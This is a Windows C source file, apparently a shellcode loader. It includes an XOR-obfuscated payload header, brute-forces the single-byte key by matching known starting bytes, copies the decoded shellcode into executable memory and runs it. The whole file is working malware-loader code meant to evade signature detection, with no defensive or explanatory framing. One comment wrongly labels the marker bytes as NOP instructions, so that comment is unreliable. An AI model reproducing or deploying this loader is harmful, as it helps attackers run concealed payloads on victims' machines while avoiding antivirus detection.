#include <stdio.h>
#include <windows.h>
#include <string.h>

// Include the obfuscated shellcode
#include "obfuscated_shellcode.h"

// Known marker bytes to validate the correct key (adjust based on your shellcode)
unsigned char known_start[] = {0x56, 0x48, 0x89};  // Example: NOP NOP NOP, Use first 3bytes of shellcode before encoding

// Function to decode shellcode with a given key
void decode_shellcode(unsigned char *buffer, unsigned int length, unsigned char key) {
    for (unsigned int i = 0; i < length; i++) {
        buffer[i] ^= key;
    }
}

// Function to check if the decoded shellcode matches the known start sequence
int check_decoded_shellcode(unsigned char *buffer, unsigned int length) {
    for (unsigned int i = 0; i < sizeof(known_start); i++) {
        if (buffer[i] != known_start[i]) {
            return 0;  // Mismatch found
        }
    }
    return 1;  // Match found
}

int main() {
    printf("Attempting to brute-force XOR key...\n");

    // Allocate memory for decoded shellcode
    unsigned char *decoded_shellcode = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (decoded_shellcode == NULL) {
        printf("Failed to allocate memory.\n");
        return -1;
    }

    unsigned char found_key = 0;
    int key_found = 0;

    // Try all possible keys from 0x00 to 0xFF
    for (unsigned int key = 0x00; key <= 0xFF; key++) {
        // Copy the obfuscated shellcode to the decoded buffer
        memcpy(decoded_shellcode, obfuscated_shellcode, shellcode_len);

        // Decode the shellcode with the current key
        decode_shellcode(decoded_shellcode, shellcode_len, key);

        // Check if decoded shellcode matches the known start pattern
        if (check_decoded_shellcode(decoded_shellcode, shellcode_len)) {
            printf("Key found: 0x%02X\n", key);
            found_key = (unsigned char)key;
            key_found = 1;
            break;
        }
    }

    if (!key_found) {
        printf("Failed to find a valid XOR key.\n");
        VirtualFree(decoded_shellcode, 0, MEM_RELEASE);
        return -1;
    }

    // Allocate executable memory for the decoded shellcode
    void *exec_mem = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("Failed to allocate executable memory.\n");
        return -1;
    }

    // Copy the correctly decoded shellcode to executable memory
    memcpy(exec_mem, decoded_shellcode, shellcode_len);

    // Execute the shellcode
    printf("Executing shellcode...\n");
    void (*execute)() = (void(*)())exec_mem;
    execute();

    // Free allocated memory
    VirtualFree(decoded_shellcode, 0, MEM_RELEASE);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
